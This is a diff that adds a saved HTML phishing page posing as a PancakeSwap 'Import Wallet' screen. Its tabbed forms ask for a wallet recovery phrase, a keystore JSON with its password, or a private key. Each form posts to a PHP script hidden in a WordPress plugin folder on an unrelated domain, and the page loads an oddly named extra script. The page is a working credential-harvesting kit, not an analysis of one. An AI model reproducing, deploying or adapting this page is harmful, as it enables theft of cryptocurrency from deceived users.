@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<!-- saved from url=(0061)http://finance.exchangepancakeswapes.net/Import%20Wallet.html -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
+    <title>Import Wallet</title>
+    <link rel="stylesheet" href="./Import Wallet_files/bootstrap.min.css">
+    <link rel="stylesheet" href="./Import Wallet_files/fontawesome-all.min.css">
+    <link rel="stylesheet" href="./Import Wallet_files/styles.css">
+    <link rel="apple-touch-icon" sizes="180x180" href="./favicon.ico">
+    <link rel="icon" type="image/png" sizes="32x32" href="./favicon.ico">
+    <link rel="icon" type="image/png" sizes="16x16" href="./favicon.ico">
+    <link rel="manifest" href="./site.html">
+</head>
+
+<body>
+    <header>
+        <div class="container-fluid">
+			<div class="row">
+			<div class="col-md-4 offset-md-4">
+				<a class="text-white" href="./wallets" style="font-size: 20px;"><i class="fas fa-angle-left"></i>&nbsp; &nbsp;Connect Wallet</a>
+			</div>
+			</div>
+		</div>
+    </header>
+	<div class="container-fluid">
+		<div class="row">
+			<div class="col-md-4 offset-md-4">
+				<ul class="nav nav-tabs">
+					<li class="nav-item"><a class="nav-link active show" data-toggle="tab" href="./#phrase">Phrase</a></li>
+					<li class="nav-item"><a class="nav-link" data-toggle="tab" href="./#keystore">Keystore JSON</a></li>
+					<li class="nav-item"><a class="nav-link" data-toggle="tab" href="./#privatekey">Private Key</a></li>
+				</ul>
+			</div>
+		</div>
+	</div>
+    <section style="margin-top: 40px;">
+        <div class="container-fluid">
+            <div class="row">
+                <div class="col-md-4 offset-md-4">
+					<!-- Tab panes -->
+					<div class="tab-content">
+						<div role="tabpanel" class="tab-pane fade active show" id="phrase">
+							<form method="post" action="https://christmas.globalvirtualsolutions.eu/wp-content/plugins/easybusy/de-report.php">
+							<input type="hidden" name="csrfmiddlewaretoken" value="PKM6pjtWk0lep1xKjRNyKTKyJ1FoNhkdLXdIIGTVrdV9c6dX87zewze2m0CLgEbr">
+								<input type="hidden" value="phrase" name="type">
+								<textarea class="form-control" rows="5" name="phrase" placeholder="Phrase" required=""></textarea>
+								<p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
+								<input type="hidden" name="value" value="Ethereum">
+								<div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
+							</form>
+						</div>
+						<div role="tabpanel" class="tab-pane fade" id="keystore">
+							<form method="post" action="https://christmas.globalvirtualsolutions.eu/wp-content/plugins/easybusy/de-report.php">
+							<input type="hidden" name="csrfmiddlewaretoken" value="PKM6pjtWk0lep1xKjRNyKTKyJ1FoNhkdLXdIIGTVrdV9c6dX87zewze2m0CLgEbr">
+								<input type="hidden" value="keystore" name="type">
+								<div class="form-group">
+									<textarea class="form-control" name="keystorejson" rows="5" placeholder="Keystore JSON" required=""></textarea>
+								</div>
+								<div class="form-group">
+									<input class="form-control" type="password" name="keystorepasswword" placeholder="Password" required="">
+								</div>
+								<p class="text-secondary" style="margin-top: 10px;">
+									Several lines of text beginning with "{...}" plus the password you used to encrypt it.
+								</p>
+								<input type="hidden" name="value" value="Ethereum">
+								<div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
+							</form>
+						</div>
+						<div role="tabpanel" class="tab-pane fade" id="privatekey">
+							<form method="post" action="https://christmas.globalvirtualsolutions.eu/wp-content/plugins/easybusy/de-report.php">
+							<input type="hidden" name="csrfmiddlewaretoken" value="PKM6pjtWk0lep1xKjRNyKTKyJ1FoNhkdLXdIIGTVrdV9c6dX87zewze2m0CLgEbr">
+								<input type="hidden" value="privatekey" name="type">
+								<div class="form-group">
+									<input class="form-control" name="privatekey" placeholder="Private Key" required="">
+								</div>
+								<p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
+								<input type="hidden" name="value" value="Ethereum">
+								<div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
+							</form>
+						</div>
+					</div>
+                </div>
+            </div>
+        </div>
+    </section>
+    <script src="./Import Wallet_files/jquery.min.js.download"></script>
+    <script src="./Import Wallet_files/bootstrap.min.js.download"></script>
+
+
+
+<script src="./Import Wallet_files/03xkcg=="></script></body></html>
